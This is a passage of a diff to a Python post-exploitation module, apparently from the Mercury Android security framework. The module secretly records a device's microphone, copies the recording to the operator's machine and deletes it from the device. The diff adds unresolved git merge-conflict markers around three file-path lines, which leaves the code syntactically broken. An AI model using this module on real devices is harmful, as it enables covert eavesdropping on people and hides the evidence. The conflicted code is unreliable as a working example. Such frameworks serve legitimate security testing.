@@ -45,7 +45,11 @@ mercury> run post.capture.microphone /home/user/Desktop/test.3gp
         recorder.setAudioSource(AudioSource.MIC)
         recorder.setOutputFormat(OutputFormat.THREE_GPP)
         recorder.setAudioEncoder(AudioEncoder.AMR_NB)
+<<<<<<< HEAD
         recorder.setOutputFile("/data/data/com.mwr.dz/recording.3gp")
+=======
+        recorder.setOutputFile("/data/data/com.mwr.dz/files/recording.3gp")
+>>>>>>> af77d94f88eb284531c3c26687553c7ca20efc8e
         recorder.prepare()
         
         self.stdout.write("[+] Recording started\n")
@@ -57,13 +61,21 @@ mercury> run post.capture.microphone /home/user/Desktop/test.3gp
         recorder.release()
         
         # Download
+<<<<<<< HEAD
         length = self.downloadFile("/data/data/com.mwr.dz/recording.3gp", arguments.destination)
+=======
+        length = self.downloadFile("/data/data/com.mwr.dz/files/recording.3gp", arguments.destination)
+>>>>>>> af77d94f88eb284531c3c26687553c7ca20efc8e
         
         if length != None:
             self.stdout.write("[+] Done.\n")
             
             # Remove recording from device
+<<<<<<< HEAD
             self.shellExec("rm /data/data/com.mwr.dz/recording.3gp")
+=======
+            self.shellExec("rm /data/data/com.mwr.dz/files/recording.3gp")
+>>>>>>> af77d94f88eb284531c3c26687553c7ca20efc8e
         else:
             self.stderr.write("[-] Recording download failed.\n")
             
